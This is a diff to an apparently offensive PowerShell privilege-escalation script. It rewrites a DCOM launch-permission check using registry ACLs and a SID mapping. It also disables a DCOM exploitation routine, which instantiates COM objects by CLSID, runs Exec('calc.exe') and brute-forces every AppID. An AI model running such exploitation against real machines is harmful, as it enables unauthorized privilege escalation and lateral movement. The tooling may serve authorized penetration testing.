@@ -287,6 +287,31 @@ public class Win32 {
 }
 "@
 
+function Get-LocalizedUserMapping {
+    $localizedUser = @{}
+
+    # Define a hashtable with common localized user names and their corresponding SIDs
+    $userMappings = @{
+        'NT AUTHORITY\SYSTEM' = 'S-1-5-18'
+        'NT AUTHORITY\NETWORK SERVICE' = 'S-1-5-20'
+        'NT AUTHORITY\LOCAL SERVICE' = 'S-1-5-19'
+        'Everyone' = 'S-1-1-0'
+        'Authenticated Users' = 'S-1-5-11'
+        'Administrators' = 'S-1-5-32-544'
+        'Users' = 'S-1-5-32-545'
+    }
+
+    # Populate the localizedUser hashtable
+    foreach ($key in $userMappings.Keys) {
+        $localizedUser[$key] = [PSCustomObject]@{
+            Name = $key
+            SID = $userMappings[$key]
+        }
+    }
+
+    return $localizedUser
+}
+
 function splitStringToColumns {
     param (
         [string]$inputString
@@ -1238,40 +1263,47 @@ function tryCOMObjectAbuse {
 function checkDCOMLateralMovement {
     if ($DEBUG_MODE) { Write-Output "Checking for DCOM Lateral Movement..." }
 
+    # Get the mapping of localized users
+    $localizedUser = Get-LocalizedUserMapping
+
     try {
         Write-Output "[*] Checking for DCOM misconfigurations..."
-        $dcomAppID = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication"
-        if ($dcomAppID) {
+        $dcomApplications = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication"
+        
+        if ($dcomApplications) {
             Write-Output "[+] DCOM Applications detected, analyzing permissions..."
 
-            $dcomAppID | ForEach-Object {
-                $appID = $_.AppID
-                $appName = $_.Description
+            foreach ($app in $dcomApplications) {
+                $appID = $app.AppID
+                $appName = $app.Description
                 $appSetting = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'"
-                $launchPerms = $appSetting.LaunchPermission
                 $runAsUser = $appSetting.RunAsUser
 
-                if ($launchPerms) {
-                    Write-Output "[*] Checking AppID: $appID ($appName)"
+                # Get the ACL for the CLSID
+                $clsidPath = "HKLM:\Software\Classes\CLSID\$appID"
+                if (Test-Path $clsidPath) {
+                    $acl = Get-Acl -Path $clsidPath
+                    $hasMisconfiguredLaunchPerms = $false
 
-                    foreach ($sid in @('S-1-1-0', 'S-1-5-11')) { # SIDs for Everyone and Authenticated Users
-                        if ($launchPerms -contains $sid) {
+                    # Check ACL for known users
+                    foreach ($accessRule in $acl.Access) {
+                        $identity = $accessRule.IdentityReference.ToString()
+
+                        if ($localizedUser.ContainsKey($identity)) {
                             Write-Output "[+] Found AppID with misconfigured Launch Permissions: $appID ($appName)"
-                            Write-Output "    Launch Permissions include: $sid"
+                            Write-Output "    Launch Permissions include: $identity (SID: $($localizedUser[$identity].SID))"
                             Write-Output "    RunAsUser: $runAsUser"
                             $gCollect['OtherData']["DCOMLateralMovementMisconfigured"] = $appID
-                            break
+                            $hasMisconfiguredLaunchPerms = $true
                         }
                     }
-                } else {
-                    if ($DEBUG_MODE) { Write-Output "[-] No Launch Permissions found for AppID: $appID" }
-                }
 
-                # Check if it's running as an elevated user (like SYSTEM)
-                if ($runAsUser -and $runAsUser -match "SYSTEM|Administrator") {
-                    Write-Output "[+] AppID $appID is running as a privileged user: $runAsUser"
+                    # Check if it's running as an elevated user (like SYSTEM or Administrator)
+                    if ($runAsUser -and ($localizedUser.Values | Where-Object { $_.Name -eq $runAsUser })) {
+                        Write-Output "[+] AppID $appID is running as a privileged user: $runAsUser"
+                    }
                 } else {
-                    if ($DEBUG_MODE) {  Write-Output "[-] AppID $appID is running as a less privileged user or Interactive User." }
+                    if ($DEBUG_MODE) { Write-Output "[-] CLSID path does not exist for AppID: $appID" }
                 }
             }
         } else {
@@ -1284,38 +1316,40 @@ function checkDCOMLateralMovement {
 
 function tryDCOMLateralMovement {
     if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via DCOM Lateral Movement..." }
+    # This is still largely TODO
+    if ($false) {
+        try {
+            $dcomAppID = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication"
 
-    try {
-        $dcomAppID = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication"
-
-        # Try misconfigured ones first (if any were found in check phase)
-        if ($gCollect['OtherData']["DCOMLateralMovementMisconfigured"]) {
-            Write-Output "[+] Attempting exploitation on misconfigured DCOM AppID(s)..."
-            $gCollect['OtherData']["DCOMLateralMovementMisconfigured"] | ForEach-Object {
-                try {
-                    $comObject = [Activator]::CreateInstance([Type]::GetTypeFromCLSID($_))
-                    $comObject.Exec("calc.exe") # PoC with calc.exe
-                    Write-Output "[+] DCOM exploitation successful on AppID: $_"
-                } catch {
-                    Write-Output "[-] Error during DCOM exploitation attempt: $_"
+            # Try misconfigured ones first (if any were found in check phase)
+            if ($gCollect['OtherData']["DCOMLateralMovementMisconfigured"]) {
+                Write-Output "[+] Attempting exploitation on misconfigured DCOM AppID(s)..."
+                $gCollect['OtherData']["DCOMLateralMovementMisconfigured"] | ForEach-Object {
+                    try {
+                        $comObject = [Activator]::CreateInstance([Type]::GetTypeFromCLSID($_))
+                        $comObject.Exec("calc.exe") # PoC with calc.exe
+                        Write-Output "[+] DCOM exploitation successful on AppID: $_"
+                    } catch {
+                        Write-Output "[-] Error during DCOM exploitation attempt: $_"
+                    }
                 }
             }
-        }
 
-        # Bruteforce attempt on all AppIDs
-        Write-Output "[+] Bruteforce exploitation attempt on all DCOM AppIDs..."
-        $dcomAppID | ForEach-Object {
-            $appID = $_.AppID
-            try {
-                $comObject = [Activator]::CreateInstance([Type]::GetTypeFromCLSID($appID))
-                $comObject.Exec("calc.exe")
-                Write-Output "[+] DCOM exploitation successful on AppID: $appID"
-            } catch {
-                if ($DEBUG_MODE) { Write-Output "[-] Error during DCOM exploitation attempt on AppID: $appID - $_" }
+            # Bruteforce attempt on all AppIDs
+            Write-Output "[+] Bruteforce exploitation attempt on all DCOM AppIDs..."
+            $dcomAppID | ForEach-Object {
+                $appID = $_.AppID
+                try {
+                    $comObject = [Activator]::CreateInstance([Type]::GetTypeFromCLSID($appID))
+                    $comObject.Exec("calc.exe")
+                    Write-Output "[+] DCOM exploitation successful on AppID: $appID"
+                } catch {
+                    if ($DEBUG_MODE) { Write-Output "[-] Error during DCOM exploitation attempt on AppID: $appID - $_" }
+                }
             }
+        } catch {
+            Write-Output "[-] Error trying DCOM Lateral Movement: $_"
         }
-    } catch {
-        Write-Output "[-] Error trying DCOM Lateral Movement: $_"
     }
 }
 
